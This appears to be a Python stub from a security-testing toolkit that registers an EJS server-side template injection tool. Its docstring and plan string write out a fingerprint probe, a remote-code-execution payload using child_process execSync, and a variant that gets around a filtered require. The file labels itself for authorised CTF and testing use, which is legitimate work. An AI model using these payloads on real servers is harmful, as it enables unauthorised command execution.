"""EJS SSTI 利用 —— 占位符(逐引擎实现,本文件待实现)。

实现要点:
指纹: <%= 7*7 %>→49。
RCE: <%= global.process.mainModule.require('child_process').execSync(cmd).toString() %>
require 被过滤: global.process.mainModule.constructor._load('child_process')。

仅用于授权 CTF / 安全测试环境。
"""
from app.core.registry import register_tool

from tools.web.ssti_base import SstiEngineTool


@register_tool
class SstiEjsTool(SstiEngineTool):
    name = "ssti_ejs"
    description = "EJS(Node) SSTI:模板直接内嵌 JS,execSync 即 RCE(占位符)"
    engine_key = "ejs"
    engine_name = "EJS"
    default_mode = "exec"
    plan = r"""指纹: <%= 7*7 %>→49。
RCE: <%= global.process.mainModule.require('child_process').execSync(cmd).toString() %>
require 被过滤: global.process.mainModule.constructor._load('child_process')。"""
